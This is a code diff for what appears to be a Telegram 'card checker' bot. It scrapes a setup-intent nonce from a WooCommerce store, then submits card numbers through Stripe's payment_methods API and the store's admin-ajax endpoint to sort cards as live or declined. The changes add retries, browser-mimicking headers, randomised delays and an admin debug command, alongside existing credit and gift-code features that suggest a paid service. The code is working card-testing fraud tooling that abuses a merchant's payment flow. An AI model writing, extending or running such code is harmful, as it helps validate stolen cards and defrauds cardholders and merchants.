@@ -173,8 +173,10 @@ def parseX(data, start, end):
         if end not in data[star:]:
             return None
         last = data.index(end, star)
-        return data[star:last]
-    except (ValueError, TypeError, AttributeError):
+        result = data[star:last]
+        return result if result and result != "None" else None
+    except (ValueError, TypeError, AttributeError) as e:
+        logger.debug(f"parseX error: {e}")
         return None
 
 def generate_gift_code(length=16):
@@ -613,48 +615,141 @@ async def update_gift_code_usage(code, user_id):
     
     return True
 
+async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Debug command to test setup intent"""
+    user_id = update.effective_user.id
+    
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    await update.message.reply_text("🔄 Testing setup intent...")
+    
+    # Clear cache
+    global setup_intent_cache, last_cache_time
+    setup_intent_cache = {}
+    last_cache_time = 0
+    
+    # Test getting setup intent
+    nonce, session = await get_setup_intent()
+    
+    if nonce and session:
+        await update.message.reply_text(
+            f"✅ Setup Intent Test SUCCESS\n"
+            f"Nonce length: {len(nonce)}\n"
+            f"Nonce (first 20 chars): {nonce[:20]}...\n"
+            f"Session: {'Active' if not session.closed else 'Closed'}"
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ Setup Intent Test FAILED\n"
+            f"Nonce: {nonce}\n"
+            f"Session: {session}\n\n"
+            f"Please check:\n"
+            f"1. DOMAIN is correct: {DOMAIN}\n"
+            f"2. Website is accessible\n"
+            f"3. No firewall blocking"
+        )
+
 async def get_setup_intent():
-    """Get setup intent nonce with caching"""
+    """Get setup intent nonce with caching and retry"""
     global setup_intent_cache, last_cache_time
     
     current_time = time.time()
     
-    # Check cache (3 minutes instead of 5 for freshness)
+    # Check cache (3 minutes)
     if "nonce" in setup_intent_cache and current_time - last_cache_time < 180:
         return setup_intent_cache["nonce"], setup_intent_cache["session"]
     
-    # Get fresh setup intent
-    connector = aiohttp.TCPConnector(ssl=False)
-    timeout = aiohttp.ClientTimeout(total=10)
-    
-    try:
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            headers = {
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                "user-agent": random.choice(USER_AGENTS),
-            }
+    # Try multiple times to get fresh setup intent
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            connector = aiohttp.TCPConnector(ssl=False)
+            timeout = aiohttp.ClientTimeout(total=15)
             
-            async with session.get(f"{DOMAIN}/my-account/add-payment-method/", headers=headers, timeout=10) as response:
-                if response.status != 200:
-                    return None, None
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+                headers = {
+                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "accept-language": "en-US,en;q=0.9",
+                    "user-agent": random.choice(USER_AGENTS),
+                    "cache-control": "no-cache",
+                    "pragma": "no-cache"
+                }
                 
-                html = await response.text()
-                nonce = parseX(html, '"createAndConfirmSetupIntentNonce":"', '"')
+                # Add cookies to mimic real browser
+                jar = aiohttp.CookieJar(unsafe=True)
+                session = aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=jar)
                 
-                if nonce and len(nonce) > 10 and nonce != "None":
-                    setup_intent_cache = {
-                        "nonce": nonce,
-                        "session": session,
-                        "timestamp": current_time
-                    }
-                    last_cache_time = current_time
-                    return nonce, session
-                else:
-                    return None, None
+                async with session.get(
+                    f"{DOMAIN}/my-account/add-payment-method/", 
+                    headers=headers, 
+                    timeout=15
+                ) as response:
+                    if response.status != 200:
+                        logger.error(f"Setup intent HTTP error: {response.status}")
+                        if attempt < max_retries - 1:
+                            await asyncio.sleep(1)
+                            continue
+                        return None, None
+                    
+                    html = await response.text()
+                    
+                    # Try multiple patterns to find the nonce
+                    nonce = None
+                    
+                    # Pattern 1: Standard pattern
+                    nonce = parseX(html, '"createAndConfirmSetupIntentNonce":"', '"')
+                    
+                    # Pattern 2: Alternative pattern
+                    if not nonce or nonce == "None":
+                        nonce = parseX(html, 'createAndConfirmSetupIntentNonce":"', '"')
+                    
+                    # Pattern 3: Look in script tags
+                    if not nonce or nonce == "None":
+                        import re
+                        script_pattern = r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']'
+                        matches = re.search(script_pattern, html)
+                        if matches:
+                            nonce = matches.group(1)
+                    
+                    if nonce and len(nonce) > 10 and nonce != "None":
+                        # Test the nonce by making a simple request
+                        test_headers = headers.copy()
+                        test_headers.update({
+                            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                            "x-requested-with": "XMLHttpRequest",
+                            "referer": f"{DOMAIN}/my-account/add-payment-method/",
+                        })
+                        
+                        # Store session and nonce in cache
+                        setup_intent_cache = {
+                            "nonce": nonce,
+                            "session": session,
+                            "timestamp": current_time
+                        }
+                        last_cache_time = current_time
+                        
+                        logger.info(f"✅ Setup intent obtained (attempt {attempt + 1})")
+                        return nonce, session
+                    else:
+                        logger.error(f"Nonce not found in HTML (attempt {attempt + 1})")
+                        if attempt < max_retries - 1:
+                            await asyncio.sleep(2)
+                            continue
+            
+        except asyncio.TimeoutError:
+            logger.error(f"Timeout getting setup intent (attempt {attempt + 1})")
+            if attempt < max_retries - 1:
+                await asyncio.sleep(2)
+                continue
+        except Exception as e:
+            logger.error(f"Error getting setup intent (attempt {attempt + 1}): {e}")
+            if attempt < max_retries - 1:
+                await asyncio.sleep(2)
+                continue
     
-    except Exception as e:
-        logger.error(f"Error getting setup intent: {e}")
-    
+    logger.error("Failed to get setup intent after all retries")
     return None, None
 
 # ==================== CALLBACK HANDLERS ====================
@@ -931,10 +1026,18 @@ async def check_single_card_fast(card):
         # Get billing address based on card BIN
         billing_address = get_billing_address(cc_clean[:6])
         
-        # Get setup intent (cached)
+        # Try to get setup intent
         setup_intent_nonce, session = await get_setup_intent()
         if not setup_intent_nonce or not session:
-            return card, "declined", "❌ Setup Error - No session", 0
+            # Try one more time without cache
+            logger.warning("Setup intent failed, retrying fresh...")
+            global setup_intent_cache, last_cache_time
+            setup_intent_cache = {}
+            last_cache_time = 0
+            
+            setup_intent_nonce, session = await get_setup_intent()
+            if not setup_intent_nonce or not session:
+                return card, "declined", "❌ Setup Error - No session", 0
         
         # Step 1: Create payment method with Stripe (FAST)
         headers1 = {
@@ -962,16 +1065,18 @@ async def check_single_card_fast(card):
         }
         
         try:
-            async with session.post("https://api.stripe.com/v1/payment_methods", headers=headers1, data=data1, timeout=5) as response:
+            async with session.post("https://api.stripe.com/v1/payment_methods", headers=headers1, data=data1, timeout=8) as response:
                 if response.status == 200:
                     req1 = await response.text()
                 else:
-                    # Return as error, not actual decline
-                    return card, "declined", f"❌ HTTP Error {response.status}", response.status
+                    logger.error(f"Stripe API error: {response.status}")
+                    return card, "declined", f"❌ Stripe Error {response.status}", response.status
         except asyncio.TimeoutError:
+            logger.error("Stripe timeout")
             return card, "declined", "❌ Stripe Timeout", 0
         except Exception as e:
-            return card, "declined", f"❌ Network Error: {str(e)[:30]}", 0
+            logger.error(f"Stripe network error: {e}")
+            return card, "declined", f"❌ Network Error", 0
         
         try:
             pm_data = json.loads(req1)
@@ -998,7 +1103,7 @@ async def check_single_card_fast(card):
             return card, "declined", "❌ Invalid Response", 0
         
         # Small delay before next request
-        await asyncio.sleep(random.uniform(0.3, 0.8))
+        await asyncio.sleep(random.uniform(0.5, 1.5))
         
         # Step 2: Send to WooCommerce (FAST)
         headers2 = {
@@ -1018,16 +1123,18 @@ async def check_single_card_fast(card):
         }
         
         try:
-            async with session.post(f"{DOMAIN}/wp-admin/admin-ajax.php", headers=headers2, data=data2, timeout=5) as response:
+            async with session.post(f"{DOMAIN}/wp-admin/admin-ajax.php", headers=headers2, data=data2, timeout=8) as response:
                 if response.status == 200:
                     req2 = await response.text()
                 else:
-                    # HTTP error - don't deduct credit
+                    logger.error(f"WooCommerce error: {response.status}")
                     return card, "declined", f"❌ Server Error {response.status}", response.status
         except asyncio.TimeoutError:
+            logger.error("WooCommerce timeout")
             return card, "declined", "❌ AJAX Timeout", 0
         except Exception as e:
-            return card, "declined", f"❌ AJAX Error: {str(e)[:30]}", 0
+            logger.error(f"WooCommerce network error: {e}")
+            return card, "declined", f"❌ AJAX Error", 0
         
         try:
             result_data = json.loads(req2)
@@ -1054,6 +1161,7 @@ async def check_single_card_fast(card):
     except ValueError:
         return card, "declined", "❌ Invalid Format", 0
     except Exception as e:
+        logger.error(f"General error in check_single_card_fast: {e}")
         return card, "declined", f"❌ Error: {str(e)[:20]}", 0
 
 async def mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2869,6 +2977,7 @@ async def main():
     application.add_handler(CommandHandler("addcr", addcr_command))
     application.add_handler(CommandHandler("gengift", gengift_command))
     application.add_handler(CommandHandler("listgifts", listgifts_command))
+    application.add_handler(CommandHandler("debug", debug_command))
     
     # ========== MESSAGE HANDLERS ==========
     application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload_message))
